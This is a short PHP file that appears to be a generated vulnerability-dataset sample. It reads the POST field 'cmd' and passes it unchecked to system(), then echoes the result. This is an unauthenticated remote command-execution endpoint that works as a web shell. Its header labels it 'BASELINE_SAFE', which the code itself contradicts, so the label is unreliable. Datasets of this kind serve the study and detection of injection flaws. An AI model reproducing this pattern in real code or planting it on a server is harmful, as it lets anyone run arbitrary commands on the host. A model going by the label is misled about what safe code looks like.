<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_ISSET; SKELETON=S1; KEY=cmd; SINK=B1; VAR=v0039 */
function SINK_B1($command){
    system($command);
}
$inp = isset($_POST["cmd"]) ? (string)$_POST["cmd"] : "";
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B1($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
